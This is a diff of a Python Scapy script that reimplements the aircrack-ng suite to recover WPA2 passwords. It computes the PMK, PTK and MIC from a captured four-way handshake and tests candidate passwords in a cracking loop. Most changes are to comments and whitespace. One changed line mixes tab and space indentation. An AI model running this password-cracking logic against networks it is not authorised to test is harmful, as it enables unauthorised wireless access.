@@ -1,15 +1,15 @@
-# Author Franz Gastring
-# Reimplementando as fetrramentas airodump-ng, airreplay-ng e o aircrack-ng para WPA2 
-# Algoritmo para estudo didatico do modulo Scapy
+# Franz Gastring
+# 2019
+# Reimplementando as ferramentas airodump-ng, airreplay-ng e o aircrack-ng para WPA2 
+# reference: https://nicholastsmith.wordpress.com/2016/11/15/wpa2-key-derivation-with-anaconda-python/
 
-# Creditos a este blog que serviu como base para a implementar
-# https://nicholastsmith.wordpress.com/2016/11/15/wpa2-key-derivation-with-anaconda-python/
 from scapy.all import *
 from threading import Thread
 
 import os # responsavel por chamar comandos do sistema
 import time # para usar delay e timestamp 
 import hmac
+
 from binascii import a2b_hex, b2a_hex
 from hashlib import pbkdf2_hmac, sha1, md5
  
@@ -30,7 +30,6 @@ def PRF(key, A, B):
         i += 1
     return R[0:nByte]
  
- 
 #Compute the 1st message integrity check for a WPA 4-way handshake
 #pwd:       The password to test
 #ssid:      The ssid of the AP
@@ -42,10 +41,9 @@ def PRF(key, A, B):
 #return:    (x, y, z) where x is the mic, y is the PTK, and z is the PMK
 
 def MakeMIC(pwd, ssid, A, B, data, wpa = False):
-
-
     #Create the pairwise master key using 4096 iterations of hmac-sha1
     #to generate a 32 byte value
+
     pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
     #Make the pairwise transient key (PTK)
     ptk = PRF(pmk, A, B)
@@ -54,7 +52,6 @@ def MakeMIC(pwd, ssid, A, B, data, wpa = False):
     #Create the MICs using HMAC-SHA1 of data and return all computed values
     mics = [hmac.new(ptk[0:16], i, hmacFunc).digest() for i in data]
     return (mics, ptk, pmk)
-
 
 def WpaCrack(S, ssid, aNonce, sNonce, apMac, cliMac, data, targMic):
     # ordering the generation of A and B
@@ -71,8 +68,8 @@ def WpaCrack(S, ssid, aNonce, sNonce, apMac, cliMac, data, targMic):
         
         print('Desired MIC1:\t\t' + targMic)
         print('Computed MIC1:\t\t' + v)
-        
-        if(v != targMic):
+
+	if(v != targMic):
             continue
 
         print('##########################################')
